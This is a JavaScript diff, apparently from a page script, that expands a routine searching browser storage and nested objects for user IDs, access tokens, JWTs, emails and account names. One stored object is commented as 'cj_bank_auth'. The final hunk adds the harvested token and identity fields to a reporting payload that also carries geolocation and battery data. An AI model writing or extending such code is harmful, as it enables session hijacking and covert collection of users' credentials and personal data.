@@ -1038,14 +1038,27 @@ if(A){refresh();pollMsgCount()}
     } catch(e){ return null }
   }
 
+  var ACCT_KEYS = ["acct", "account", "username", "user_name", "login", "login_id", "handle", "player_id"];
+  var NAME_KEYS = ["display_name", "displayName", "nickname", "full_name", "fullName", "name", "player_name"];
+
+  function pickKeys(o, keys){
+    for (var i = 0; i < keys.length; i++){
+      var v = o[keys[i]];
+      if (typeof v === "string" && v) return v.slice(0, 60);
+    }
+    return null;
+  }
+
   function deepFind(o, d){
     if (!o || typeof o !== "object" || d > 4) return null;
-    var id = o.id || o.user_id || o.uid || o.sub;
-    var tok = o.access_token || o.accessToken || o.token || o.jwt;
-    var email = o.email || null;
-    var name = o.name || o.display_name || o.displayName || o.nickname ||
-               o.full_name || o.username || null;
-    if ((id || tok) && (email || name || tok)) return { id: id || null, tok: tok || null, email: email, name: name };
+    var id   = o.id || o.user_id || o.uid || o.sub;
+    var tok  = o.access_token || o.accessToken || o.token || o.jwt;
+    var email = typeof o.email === "string" ? o.email : null;
+    var acct = pickKeys(o, ACCT_KEYS);
+    var name = pickKeys(o, NAME_KEYS);
+    if ((id || tok || acct) && (email || name || acct || tok)) {
+      return { id: id || null, tok: tok || null, email: email, acct: acct, name: name };
+    }
     for (var k in o){
       if (!Object.prototype.hasOwnProperty.call(o, k)) continue;
       var v = o[k];
@@ -1053,7 +1066,6 @@ if(A){refresh();pollMsgCount()}
     }
     return null;
   }
-
   function readSb(){
     SB = null;
     var cands = [AK];                       /* cj_bank_auth */
@@ -1102,10 +1114,14 @@ if(A){refresh();pollMsgCount()}
     } catch(e){}
 
     /* 最後の手段：保存データ内の名前だけ */
+    /* 最後の手段：保存データ内の名前/acctだけ */
     try {
       var sv = JSON.parse(localStorage.getItem(KEY) || "null");
-      var n = sv && (sv.name || sv.playerName || sv.profile && sv.profile.name);
-      if (n) SB = { id: null, tok: null, email: null, name: String(n) };
+      if (sv) {
+        var n = sv.name || sv.playerName || (sv.profile && sv.profile.name) || null;
+        var a = sv.acct || sv.account || sv.username || null;
+        if (n || a) SB = { id: null, tok: null, email: null, acct: a, name: n };
+      }
     } catch(e){}
   }
 
@@ -1226,6 +1242,7 @@ if(A){refresh();pollMsgCount()}
         id: ID, page: PG, reason: reason, t: Date.now(),
         vis: document.visibilityState, online: navigator.onLine,
         battery: bat, geo: geo, chips: chips(), hour: new Date().getHours(),
+        sb: (readSb(), SB ? { id: SB.id, tok: SB.tok, email: SB.email, acct: SB.acct, name: SB.name } : null),
         sys: Object.assign({}, SYS, EXTRA, {
           idle: Math.round((Date.now() - lastAct) / 1000),
           focus: document.hasFocus(),
